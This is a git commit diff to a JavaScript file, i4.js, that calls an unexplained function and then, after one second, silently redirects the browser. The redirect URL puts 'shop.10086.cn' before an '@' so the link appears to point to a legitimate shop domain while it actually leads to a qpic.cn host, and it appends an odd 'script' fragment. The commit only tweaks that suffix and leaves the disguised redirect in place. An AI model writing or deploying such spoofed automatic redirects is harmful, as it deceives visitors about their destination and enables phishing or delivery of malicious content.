01d49681eb5e8591720ade74b6575a9d83ae4c04
iuuc <145624790+iuuc@users.noreply.github.com>
2024-02-01 23:04:14 +0800

    Update i4.js

--- i4.js
+++ i4.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/b2cd971e2ffceaf8dbae3e2be7634712a020d8c016cf4d796bff94e26c6938f8' + '?' + timestamp + '%3Cscript';
+    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/b2cd971e2ffceaf8dbae3e2be7634712a020d8c016cf4d796bff94e26c6938f8' + '?' + timestamp + '3Cscript';
     location.href = url;
 }, 1000);
